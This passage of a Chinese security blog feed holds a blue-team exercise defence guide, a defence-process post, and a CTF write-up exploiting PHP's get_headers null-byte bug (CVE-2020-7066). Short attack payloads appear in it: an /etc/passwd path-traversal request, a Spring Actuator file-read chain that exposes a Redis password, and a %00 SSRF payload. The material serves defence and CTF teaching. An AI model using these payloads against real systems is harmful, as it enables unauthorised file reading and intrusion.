|项目|部门|状态|</span><br></pre></td></tr></table></div></figure><p><strong>指纹梳理</strong></p><p>因为主机数量太大了，如果每个资产都单独去测试的话，时间代价太大，所以很有必要进行资产指纹梳理，这样如果发现某个漏洞，直接就可以为后面的批量漏洞利用提供条件了。</p><p>资产指纹根据业务情况进行有针对性的收集，主要搜集有：</p><p>21，22，23，1090，1099，2049，2181，3000，3306，4848，5000，5900，5901，6379，70</p>        <h4 id="漏洞发现">          <a href="#漏洞发现" class="heading-link"><i class="fas fa-link"></i></a>漏洞发现</h4>      <p>漏洞发现就是常规的渗透测试，但是内网的渗透区别于外网，内网主要是快速，尽可能的发现更多的漏洞，所以不需要进一步利用，比如发现了Redis未授权访问，就不要去浪费时间反弹 shell ，写密钥之类的。</p><p><strong>Example 1：</strong></p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;192.168.2.11:8888&#x2F;</span><br><span class="line">PS：前期资产发现阶段发现8888端口对应的主机有1800多台</span><br><span class="line"></span><br><span class="line">1、直接访问提示403</span><br><span class="line">2、Fuzz目录</span><br><span class="line">发现存在taskFile，https:&#x2F;&#x2F;192.168.2.11:8888&#x2F;taskFile</span><br><span class="line">3、访问https:&#x2F;&#x2F;192.168.2.11:8888&#x2F;taskFile提示参数不对</span><br><span class="line">4、Fuzz参数</span><br><span class="line">发现参数tId，https:&#x2F;&#x2F;192.168.2.11:8888&#x2F;taskFile?tId&#x3D;</span><br><span class="line">5、输入值，访问https:&#x2F;&#x2F;192.168.2.11:8888&#x2F;taskFile?tId&#x3D;1</span><br><span class="line">发现提示tId&#x3D;1不存在</span><br><span class="line">6、删除值访问https:&#x2F;&#x2F;192.168.2.11:8888&#x2F;taskFile?tId&#x3D;</span><br><span class="line">发现提示&#x2F;root&#x2F;xxx&#x2F;xxx任务不存在</span><br><span class="line">7、Fuzz漏洞，成功发现本地文件包含https:&#x2F;&#x2F;192.168.2.11:8888&#x2F;taskFile?</span><br><span class="line">tId&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></div></figure><p><strong>Example2：</strong></p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;192.168.2.11:8006&#x2F;</span><br><span class="line">PS：前期资产发现阶段发现8006端口对应的主机有180多台</span><br><span class="line"></span><br><span class="line">1、直接访问https:&#x2F;&#x2F;192.168.2.11:8006&#x2F;env，发现存在SpringBoot Actuator</span><br><span class="line">信息泄漏</span><br><span class="line">&#x2F;autoconfig</span><br><span class="line">&#x2F;beans</span><br><span class="line">&#x2F;env</span><br><span class="line">&#x2F;configprop</span><br><span class="line">&#x2F;dump</span><br><span class="line">&#x2F;health</span><br><span class="line">&#x2F;info</span><br><span class="line">&#x2F;mappings</span><br><span class="line">&#x2F;metrics</span><br><span class="line">&#x2F;shutdown</span><br><span class="line">&#x2F;trace</span><br><span class="line">&#x2F;env</span><br><span class="line">2、访问https:&#x2F;&#x2F;192.168.2.11:8006&#x2F;trace，发现存在访问</span><br><span class="line">URL：&#x2F;application.wadl</span><br><span class="line">3、直接访问发现信息泄漏，可直接看到整站的目录结构</span><br><span class="line">&#x2F;war</span><br><span class="line">&#x2F;war&#x2F;path</span><br><span class="line">...</span><br><span class="line">4、一层一层访问目录接口发现&#x2F;war&#x2F;WEB-INF&#x2F;classes目录下存在</span><br><span class="line">redis.properties文件，直接访问提示403</span><br><span class="line">5、根据前期漏洞信息、收集信息关联分析，发现在对应文件下加入content即可进行</span><br><span class="line">文件读取：&#x2F;war&#x2F;WEB-INF&#x2F;classes&#x2F;redis.properties&#x2F;content</span><br><span class="line">这样就可以直接导致web目录下任意文件读取了，批量利用发发现8006端口全部主机均</span><br><span class="line">存在此漏洞</span><br><span class="line">6、访问https:&#x2F;&#x2F;192.168.2.11:8006&#x2F;war&#x2F;WEB-INF&#x2F;classes&#x2F;</span><br><span class="line">redis.properties&#x2F;content读取到redis密码，为弱口令：Nb123456</span><br><span class="line">7、根据整理的资产指纹信息编写批量利用脚本，发现60多台Redis存在此弱口令</span><br></pre></td></tr></table></div></figure>        <h4 id="批量利用">          <a href="#批量利用" class="heading-link"><i class="fas fa-link"></i></a>批量利用</h4>      <p>这部分就是批量发现问题主机了，大部分事需要写脚本，如果有相关工具就更好。</p><p>比如我们在上面发现的漏洞，利用收集的资产指纹信息直接编写脚本批量跑一遍就可以了。</p><p><img src="/2021/03/13/2021HW%E5%B9%B2%E8%B4%A7-%E8%93%9D%E9%98%9F/1.jpg"></p><p>当然其他漏洞也一样，这里主要为测试的几个典型批量为例：</p><p>SSH，FTP，MySQL，Zoomkeeper，MongoDB，Hadoop，Redis，Struct2，Weblogic，Docker，OpneSSL，Werkzeug，Jboss，ActiveMQ，Zabbix，K8S，Druid 等。</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">├── IP.txt</span><br><span class="line">├── Zookeeper</span><br><span class="line">│   ├── vul.txt</span><br><span class="line">│   └── zookeeper_unauth_access.py</span><br><span class="line">├── bash</span><br><span class="line">├── ftp</span><br><span class="line">├── memcache</span><br><span class="line">├── mongodb</span><br><span class="line">├── mssql</span><br><span class="line">├── openssl</span><br><span class="line">├── postgresql</span><br><span class="line">├── redis</span><br><span class="line">├── smb</span><br><span class="line">├── ssh</span><br><span class="line">├── st2</span><br><span class="line">├── weblogic</span><br><span class="line">├── druid</span><br><span class="line">├── zabbix</span><br><span class="line">├── docker</span><br><span class="line">...</span><br><span class="line">└── all_poc.py</span><br></pre></td></tr></table></div></figure><p>这是做过的基线检查的相关脚本，然后根据需求改了一下，也可以用POC-T，Pocsuite 等这些框架，反正能用就行了。</p>        <h4 id="信息清理">          <a href="#信息清理" class="heading-link"><i class="fas fa-link"></i></a>信息清理</h4>      <p>梳理出来的资产进行分组，无用资产该关就关。</p>        <h4 id="蜜罐">          <a href="#蜜罐" class="heading-link"><i class="fas fa-link"></i></a>蜜罐</h4>      <p>蜜罐是个好东西，能多则多，能否得分还得靠蜜罐。</p>        <h4 id="防钓鱼">          <a href="#防钓鱼" class="heading-link"><i class="fas fa-link"></i></a>防钓鱼</h4>      <p>加强对员工的安全意识培训！！！</p><p>划重点，很多目标被沦陷，入口点在钓鱼直接控制运维机。。</p><p>包括不限于：邮件，QQ，微信，电话等手段进行钓鱼社工；exe就别说了，不要乱点！！！</p><p>办公PC机可以安装火绒。</p>        <h4 id="防不甚防">          <a href="#防不甚防" class="heading-link"><i class="fas fa-link"></i></a>防不甚防</h4>      <p>各种防护设备放上去就觉得可以了？？？</p><p>一般能参加HW的都是国内渗透能力较强的大佬，手里有一些0day漏洞也很常见，甚至可能会遭受APT攻击，而大多数企业针对定向 0day，1day，APT攻击毫无还手之力，尽管手里购买了很多设备，也只能被动进行防御。</p>        <h4 id="心态">          <a href="#心态" class="heading-link"><i class="fas fa-link"></i></a>心态</h4>      <p><strong>比赛 &amp;&amp; 发现问题</strong></p><p>如果本着打个比赛的目的，该撸穿撸穿。。。</p><p>如果本着发现问题的心态，那么可以发现如今的HW已经实战化，在实战中发现全面问题，这大概才是HW的真正意义。</p>        <h4 id="应急小组">          <a href="#应急小组" class="heading-link"><i class="fas fa-link"></i></a>应急小组</h4>      <p>明确应急小组的职责，定期排查邮件系统，个人PC机是否被控。</p>        <h4 id="面对的问题">          <a href="#面对的问题" class="heading-link"><i class="fas fa-link"></i></a>面对的问题</h4>      <p>防火墙或者网闸买的再多，访问控制策略做的再细致和规范，若它们自身就存在 0day 漏洞或者 1day 漏洞没有被修补，，则可以全部被攻破。</p><p>业务系统接入了云防御，即使云端防御再好，一旦攻击者找到了未作信任策略的源站地址，一切防御都全部失效。</p><p>内网部署了很好的防御产品和策略，包括防病毒，反垃圾邮件等，但内部员工被鱼叉攻击依然会泄露重要和敏感信息。</p><p>业务系统防范严密，却在某个具有出口的测试环境中存在暗资产，或者在 GitHub 上泄露了数据，导致其成为跳板甚至被进行内网漫游或攻击者直接获得了某些重要资料和信息等等。</p><p>守住自身系统后，也该拿点分数证明实力。</p>        <h3 id="1-4-加固">          <a href="#1-4-加固" class="heading-link"><i class="fas fa-link"></i></a>1.4 加固</h3>              <h4 id="运维相关">          <a href="#运维相关" class="heading-link"><i class="fas fa-link"></i></a>运维相关</h4>      <ol><li><p>测试，开发服务器全部关停</p></li><li><p>敏感端口安全组隔离</p></li><li><p>使用堡垒机，跳板机运维</p></li><li><p>用户，权限隔离</p><p><strong>特别说明：</strong>比如：MySQL不使用默认的root用户，使用业务/项目名中间用下划线连接的方式，因为爆破都是默认用户的，这样即使存在弱口令，也将安全性提升一大截。</p></li><li><p>认证策略：密钥，双因子认证</p></li><li><p>最小化权限原则</p></li><li><p>补丁</p></li></ol>        <h4 id="安全设备">          <a href="#安全设备" class="heading-link"><i class="fas fa-link"></i></a>安全设备</h4>      <p><strong>WAF：</strong>使用防火墙，防御大多数攻击。</p><p><strong>流量，日志，数据库审计：</strong>流量，日志，数据库方面一旦出现安全事故，能够快速响应，溯源分析找到问题源头。</p><p><strong>态势感知：</strong></p><p><strong>安骑士：</strong>主机安全，能够第一时间发现异常登录，异常进程，异常网络连接，后门，账户等高危安全问题，并且能够快速定位问题所在。</p><p><strong>蜜罐：</strong>攻击者进入内网后会进行内网渗透，收集信息，攻击靶标，所以部署蜜罐是发现内网异常的必要手段。主要部署了常用的服务，比如：SSH，MySQL，FTP，MongoDB，Redis，Weblogic，Struct2，Tomcat，Joomla，PostgreSQL，Shellshock，SMB，Memcache，Telnet。</p><p><strong>扫描器：</strong>由于主机量巨大，手工总会有遗漏，所以在不同网段部署扫描器，每天在0点到1点自动给开始巡检。</p>        <h4 id="环境隔离">          <a href="#环境隔离" class="heading-link"><i class="fas fa-link"></i></a>环境隔离</h4>      <p><strong>防火墙策略：</strong>虽然安全组也可以做，但是内网业务层面还需要在防火墙做策略。</p><p><strong>堡垒机：</strong>使用堡垒机是为了保证运维安全，同时保障重要系统及靶标隔离。堡垒机的登录也是用访问控制的，只允许白名单IP访问，同时堡垒机使用<strong>强口令+随机KEY登录</strong>。</p><p><strong>双因子认证</strong>：重要系统（控制台，总控系统，运维系统等）有必要的均采用堡垒机登录，无法使用的采用 <strong>白名单IP+强口令策略+随机验证码</strong> 组合策略。</p><p><strong>靶标：</strong>靶标是重中之重，一旦被攻破，直接可以收拾收拾回家，脸面不说，monkey还可能没了。靶标是只允许堡垒机IP能够访问；同时在前期要花很大功夫渗透一波，删除不必要的账户，所有账户使用 **十六位随机密码+随机6位KEY **登录。</p>        <h3 id="1-5-得分点">          <a href="#1-5-得分点" class="heading-link"><i class="fas fa-link"></i></a>1.5 得分点</h3>              <h4 id="发现">          <a href="#发现" class="heading-link"><i class="fas fa-link"></i></a>发现</h4>      <p>通过日志审计，蜜罐发现攻击日志及路径，快速响应攻击者是否已被攻破。</p>        <h4 id="处置">          <a href="#处置" class="heading-link"><i class="fas fa-link"></i></a>处置</h4>      <p>尽可能在未攻破时，将漏洞修复，或者清除webshell。</p><p>发现钓鱼邮件后分析回连IP，由应急小组进行通知并排查分析是否被钓鱼。</p>        <h4 id="溯源">          <a href="#溯源" class="heading-link"><i class="fas fa-link"></i></a>溯源</h4>      <p>蜜罐，威胁情报设备，此项可以帮助获得N+分，自动化设备会通过攻击者指纹，结合社会关系，溯源到QQ，姓名，手机号等一系列信息。</p>        <h4 id="反制">          <a href="#反制" class="heading-link"><i class="fas fa-link"></i></a>反制</h4>              <h2 id="2-护网时">          <a href="#2-护网时" class="heading-link"><i class="fas fa-link"></i></a>2. 护网时</h2>              <h3 id="2-1-查漏补缺">          <a href="#2-1-查漏补缺" class="heading-link"><i class="fas fa-link"></i></a>2.1 查漏补缺</h3>      <ol><li><p>虽然前期做了渗透测试，但毕竟也过了一段时间，所以护网期间重新找端口对应的主机，然后寻找漏洞。</p></li><li><p>数据库查看端口对应主机也可以发现一些非标准端口，比如MySQL 数据库的3303，3304，3305，3307，Redis的6377，6378等，存在弱口令。</p></li><li><p>通过日志检索，流量分析等可以发现一些弱口令问题，利用这些弱口令批量测试主机，可以发现一些MySQL，SSH，Redis弱口令。</p></li><li><p>在进行全量日志检索的时候，可以发现一些运维直接将一些敏感字段直接写在命令行中，比如MySQL连接是直接将密码写在命令行中，这样如果一台主机被入侵，那么 history 是必看的。如果该密码是通用的将直接或间接的影响更多的主机，所以统一安排将 history 命令历史清空，再统一改了下相关配置。</p></li><li><p>新建主机风险，在查看主机对应业务的时候发现了在护网开始后还是会有新主机的创建，那么这些新建的主机就存在较大的安全风险。</p></li><li><p>堡垒机安全问题，堡垒机一般是采用 白名单IP+强密码+令牌的登录方式，但是也存在 0day 漏洞。部分接口也存在直接获取全部用户包括明文密码等全部敏感信息，重置任意用户密码，更换认证方式及客户端限制等。此外，堡垒机登陆后还可以绕过沙箱限制，做一些限制的操作。</p><p><img src="/2021/03/13/2021HW%E5%B9%B2%E8%B4%A7-%E8%93%9D%E9%98%9F/2.png"></p></li></ol>        <h3 id="2-2-安全告警">          <a href="#2-2-安全告警" class="heading-link"><i class="fas fa-link"></i></a>2.2 安全告警</h3>      <p>主要就是安全设备上的安全告警了，比如蜜罐的端口探测告警，蜜罐入侵事件；态势感知的暴力破解，攻击事件；安骑士的后门，网络连接，进程，账户；WAF 封IP一把梭。</p>        <h3 id="2-3-事件分析">          <a href="#2-3-事件分析" class="heading-link"><i class="fas fa-link"></i></a>2.3 事件分析</h3>      <p>这就是应急响应，事件分析和溯源的范畴了。</p><p>当厂商告警存在恶意文件下载，地址是我们OSS的一个地址，OSS是一个静态存储服务器，供业务应用上传媒体文件，静态资源文件等使用，对于这类安全事件处理：</p><ol><li><p>如果访问的IP是业务服务器</p><ul><li>要么AK泄露了直接利用AK进行的文件增删改查；</li></ul><ul><li>要么业务上传的地方没有做严格限制，导致任意格式文件上传；</li><li>该服务器应该不光存在XSS，还存在SSRF漏洞。</li></ul></li><li><p>如果访问的IP不是业务服务器</p><p>由于OSS上传后会生成随机字符串的URL，根本是无法猜到的，那么谁访问了这个URL，那么就是这个IP上传的，这个IP就有问题。</p></li></ol>        <h3 id="2-4-防火墙策略">          <a href="#2-4-防火墙策略" class="heading-link"><i class="fas fa-link"></i></a>2.4 防火墙策略</h3>      <p>对于云平台防护来说，主要找一些和云平台有直接交互的业务，然后就需要在防火墙上做策略。</p>        <h3 id="2-5-WAF等">          <a href="#2-5-WAF等" class="heading-link"><i class="fas fa-link"></i></a>2.5 WAF等</h3>      <p>不管三七二十一，先封为敬；另外一定要及时关注安全预警，直接在WAF上做自定义规则，比如 weblogic 的，直接拦截 <code>_async ，bea_wls_internal</code> 等URL路径即可。</p>        <h3 id="2-6-安全组">          <a href="#2-6-安全组" class="heading-link"><i class="fas fa-link"></i></a>2.6 安全组</h3>      <p>发现敏感端口，高危漏洞，先把安全组做了。</p>        <h3 id="2-7-护网神操作">          <a href="#2-7-护网神操作" class="heading-link"><i class="fas fa-link"></i></a>2.7 护网神操作</h3>      <p>护网期间的神操作：</p><ul><li>无人机搞WIFI的</li><li>挖下水道进内部的（这个怕是拍电影吧）</li><li>BadUSB钓鱼的</li><li>提前半个月混入甲方的</li><li>望远镜看密码的</li><li>红队伪装蓝队进行木马钓鱼的</li><li>利用深信服0day伪装进入的</li><li>首页开局一张图片的</li><li>美人计的</li></ul>        <h2 id="3-问题思考">          <a href="#3-问题思考" class="heading-link"><i class="fas fa-link"></i></a>3. 问题思考</h2>              <h3 id="3-1-蜜罐的局限性">          <a href="#3-1-蜜罐的局限性" class="heading-link"><i class="fas fa-link"></i></a>3.1 蜜罐的局限性</h3>      <p>市面上的蜜罐和业务基本是国内都是无关联，无数据的，对于攻击队那些资深大佬来说，个人觉得应该采用的是“深度优先原则”的方式进行攻击，因为这种方式内网动作更小，更不易被察觉。</p><p>基于这个局限性，蜜罐很容易就被识破了，比如查看 hosts文件，history，网段，数据，业务等。</p>        <h3 id="3-2-安全产品">          <a href="#3-2-安全产品" class="heading-link"><i class="fas fa-link"></i></a>3.2 安全产品</h3>      <p>堡垒机，VPN，蜜罐，扫描器等这些安全产品，比如说扫描器，基本上告警源是扫描器，都肯定是忽略的，但是如果扫描器被搞了，就很尴尬了。</p>]]></content>
      
      
      <categories>
          
          <category> HW护网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HW蓝队 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HW蓝队流程</title>
      <link href="2021/03/13/HW%E8%93%9D%E9%98%9F%E6%B5%81%E7%A8%8B/"/>
      <url>2021/03/13/HW%E8%93%9D%E9%98%9F%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>可以把 HW 行动的前期准备分为三个阶段：备战期，临战期，决战期。</p>        <h2 id="1-备战期">          <a href="#1-备战期" class="heading-link"><i class="fas fa-link"></i></a>1. 备战期</h2>      <p>在备战期间，主要做两件事：一是减小攻击面，二是排查风险点。</p><a id="more"></a><p><img src="/2021/03/13/HW%E8%93%9D%E9%98%9F%E6%B5%81%E7%A8%8B/1.jpg"></p>        <h3 id="1-1-减少攻击面">          <a href="#1-1-减少攻击面" class="heading-link"><i class="fas fa-link"></i></a>1.1 减少攻击面</h3>      <p>减小攻击面就是缩小暴露面。在这流程，客户进行多轮的暴露面排查。首先，通过收集到的客户资产进行爬取相关链接，确认是否无用页面，无用系统下挂关键系统域名下，接着对一些已经业务需求不那么高的，无用的系统，闲置的服务器进行下电处理，最后对于有一定业务需求但用户较少的系统直接迁入内网，通过VPN进行业务操作。通过一系列的缩小暴露面，最终客户对外开放的端口就几个，大大降低了攻击面。</p>        <h3 id="1-2-排查风险点">          <a href="#1-2-排查风险点" class="heading-link"><i class="fas fa-link"></i></a>1.2 排查风险点</h3>      <p>在排查风险点这块，主要做两件事：一是人工渗透测试，二是webshell排查。对关键系统的服务器使用webshell排查工具进行后门排查。</p>        <h2 id="2-临战期">          <a href="#2-临战期" class="heading-link"><i class="fas fa-link"></i></a>2. 临战期</h2>      <p>在临战初期，企业举办攻防演练，通过公司内分队对攻到从上往下发起的攻击。这次攻防演练可以发现许多在备战期间忽略的地方。</p><p><img src="/2021/03/13/HW%E8%93%9D%E9%98%9F%E6%B5%81%E7%A8%8B/2.png"></p><p>客户在临战期陆续将安全设备进行部署。针对HW行动，客户对原本已有的一些安全设备进行策略优化，同时也新增一些二安全设备。主要的类型有防御设备，监控设备等。防御设备还是最常见的WAF，IPS，对WAF，IPS的策略进行优化，增强设备的防御能力。做好监控设备对主机进程进行审计，webshell监控；除了主机监控还有就是网络流量监控设备，对监测的流量进行分析。</p>        <h2 id="3-决战期">          <a href="#3-决战期" class="heading-link"><i class="fas fa-link"></i></a>3. 决战期</h2>      <p>在决战期间，最关键的就是应对每个安全事件的处置。</p>        <h3 id="3-1-组织架构">          <a href="#3-1-组织架构" class="heading-link"><i class="fas fa-link"></i></a>3.1 组织架构</h3>      <p><img src="/2021/03/13/HW%E8%93%9D%E9%98%9F%E6%B5%81%E7%A8%8B/3.png"></p><p>我们将所有的人员进行分工，主要有统筹组，监控组，研判组，网络处置组，应用处置组。</p><p><strong>统筹组</strong>主要就是对一些重大决定进行决策，统筹整个HW防守工作；</p><p><strong>监控组</strong>主要就是对WAF，IPS等安全设备进行7*24小时监控，派发，跟踪，反馈安全威胁；</p><p><strong>研判组</strong>主要就是技术支撑，对于监控组发现的攻击行为进行技术研判；</p><p><strong>网络处置组</strong>主要职责就是发现攻击时在防火墙上对攻击方进行IP封堵；</p><p><strong>应用处置组</strong>主要就是对发现的攻击和漏洞进行分析处置，安全加固。</p>        <h3 id="3-2-风险处置流程">          <a href="#3-2-风险处置流程" class="heading-link"><i class="fas fa-link"></i></a>3.2 风险处置流程</h3>      <p>根据监控设备告警划分风险等级，主机探针告警高于其它安全设备告警，主机探针作为防守的最后一道防线，若主机探针发出告警，则攻击已经进入内网，因此风险等级最高。根据风险等级不同，制定以下风险处理流程：<br><img src="/2021/03/13/HW%E8%93%9D%E9%98%9F%E6%B5%81%E7%A8%8B/4.png"></p><p>当收到主机探针告警，监控人员告知应用处置人员进行风险排查确认，同时通知网络处置组进行攻击IP封锁。应用处置组确认风险存在后，监控组立即通知机房管理员进行断网处置。随后，由应用处置组协助监控组进行溯源必证，并且对风险进行处置，删除shell脚本或木马程序。应用组处理后将结果反馈给监控组，监控组通知机房管理员将受到攻击，服务器进行下电处理，并将事件记录在防御工作列表中。</p><p><img src="/2021/03/13/HW%E8%93%9D%E9%98%9F%E6%B5%81%E7%A8%8B/5.png"></p><p>当其他安全设备监测道攻击时，监控组会将发起攻击源IP告知网络处置组进行封堵，同时将发现的告警信息发送给研判组进行研判，监控组根据研判结果通知应用处置组进行风险排查，应用处置组将加固结果反馈给监控组，监控组将事件记录在防御工作列表中。</p>]]></content>
      
      
      <categories>
          
          <category> HW护网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HW蓝队 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GKCTF2020-cve版签到</title>
      <link href="2021/03/13/GKCTF2020-cve%E7%89%88%E7%AD%BE%E5%88%B0/"/>
      <url>2021/03/13/GKCTF2020-cve%E7%89%88%E7%AD%BE%E5%88%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h2 id="1-提示">          <a href="#1-提示" class="heading-link"><i class="fas fa-link"></i></a>1. 提示</h2>      <p><img src="/2021/03/13/GKCTF2020-cve%E7%89%88%E7%AD%BE%E5%88%B0/0.png"></p><a id="more"></a>        <h2 id="2-CVE-2020-7066漏洞">          <a href="#2-CVE-2020-7066漏洞" class="heading-link"><i class="fas fa-link"></i></a>2. CVE-2020-7066漏洞</h2>      <p><span class="exturl"><a class="exturl__link" href="https://bugs.php.net/bug.php?id=79329">官方文档</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p><img src="/2021/03/13/GKCTF2020-cve%E7%89%88%E7%AD%BE%E5%88%B0/1.1.png"></p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">get_headers（）会在使用的URL中的空字节之后无声地截断任何内容。</span><br><span class="line"></span><br><span class="line">已在PHP 7.3上进行了测试，但该功能始终存在此错误。</span><br><span class="line"></span><br><span class="line">测试脚本表明，这可能导致编写良好的脚本获取意外域的标头。这些标头可能会泄漏敏感信息，或意外包含攻击者控制的数据。</span><br><span class="line"></span><br><span class="line">测试脚本：</span><br><span class="line">---------------</span><br><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F; user input</span><br><span class="line">$_GET[&#39;url&#39;] &#x3D; &quot;http:&#x2F;&#x2F;localhost\0.example.com&quot;;</span><br><span class="line"></span><br><span class="line">$host &#x3D; parse_url($_GET[&#39;url&#39;], PHP_URL_HOST);</span><br><span class="line">if (substr($host, -12) !&#x3D;&#x3D; &#39;.example.com&#39;) &#123;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">$headers &#x3D; get_headers($_GET[&#39;url&#39;]);</span><br><span class="line">var_dump($headers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">预期结果：</span><br><span class="line">----------------</span><br><span class="line">Warning: get_headers() expects parameter 1 to be a valid path, string given in php shell code on line 1</span><br><span class="line">NULL</span><br><span class="line"></span><br><span class="line">实际结果：</span><br><span class="line">--------------</span><br><span class="line">headers from http:&#x2F;&#x2F;localhost</span><br></pre></td></tr></table></div></figure>        <h3 id="描述">          <a href="#描述" class="heading-link"><i class="fas fa-link"></i></a>描述</h3>      <p>PHP 7.2.29之前的7.2.x版本、7.3.16之前的7.3.x版本和7.4.4之前的7.4.x版本中的‘<code>get_headers()</code>’函数存在安全漏洞。攻击者可利用该漏洞造成信息泄露。</p><p><strong>get_headers() 是PHP系统级函数，他返回一个包含有服务器响应一个 HTTP 请求所发送的标头的数组。</strong> 如果失败则返回 FALSE 并发出一条 E_WARNING 级别的错误信息(可用来判断远程文件是否存在)。</p><p>在低于7.2.29的PHP版本7.2.x，低于7.3.16的7.3.x和低于7.4.4的7.4.x中，<strong>将get_headers（）与用户提供的URL一起使用时</strong>，如果URL包含零（\ 0）字符，则URL将被静默地<strong>截断</strong>。<strong>这可能会导致某些软件对get_headers（）的目标做出错误的假设，并可能将某些信息发送到错误的服务器。</strong></p>        <h2 id="3-解题">          <a href="#3-解题" class="heading-link"><i class="fas fa-link"></i></a>3. 解题</h2>      <p>首页：<br><img src="/2021/03/13/GKCTF2020-cve%E7%89%88%E7%AD%BE%E5%88%B0/2.1.png"></p><p>burp抓包看包</p><p><img src="/2021/03/13/GKCTF2020-cve%E7%89%88%E7%AD%BE%E5%88%B0/2.2.png"></p><p>提示flag在localhost中，但是host得以123结尾</p><p>点击链接：</p><p><img src="/2021/03/13/GKCTF2020-cve%E7%89%88%E7%AD%BE%E5%88%B0/2.3.png"></p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;http:&#x2F;&#x2F;www.ctfhub.com  是很类似CSRF</span><br></pre></td></tr></table></div></figure><p>既然这里是一个csrf，思路应该是构造csrf让服务器去请求自己获得flag。但是这里利用正则表达式让我们请求的url只能以.ctfhub.com结尾。<br>这里就运用到的我们的CVE了，其实就是get_header()的CVE。这个函数特点就是会去请求url并返回header头部。<strong>但是CVE告诉我们，如果是用%00截断，就可能让命令去请求用户的可控网址。</strong></p><p>所以构造payload</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;http:&#x2F;&#x2F;127.0.0.123%00www.ctfhub.com</span><br></pre></td></tr></table></div></figure><p><img src="/2021/03/13/GKCTF2020-cve%E7%89%88%E7%AD%BE%E5%88%B0/2.4.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web-CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RoarCTF-2019-Easy-Java</title>
      <link href="2021/02/08/RoarCTF-2019-Easy-Java/"/>
      <url>2021/02/08/RoarCTF-2019-Easy-Java/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h2 id="RoarCTF-2019-Easy-Java">          <a href="#RoarCTF-2019-Easy-Java" class="heading-link"><i class="fas fa-link"></i></a>[RoarCTF 2019]Easy Java</h2>      <p><img src="/2021/02/08/RoarCTF-2019-Easy-Java/0.png"></p><a id="more"></a>        <h2 id="知识点：">          <a href="#知识点：" class="heading-link"><i class="fas fa-link"></i></a>知识点：</h2>      <ul><li>WEB-INF/web.xml泄露</li></ul><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">WEB-INF主要包含一下文件或目录:</span><br><span 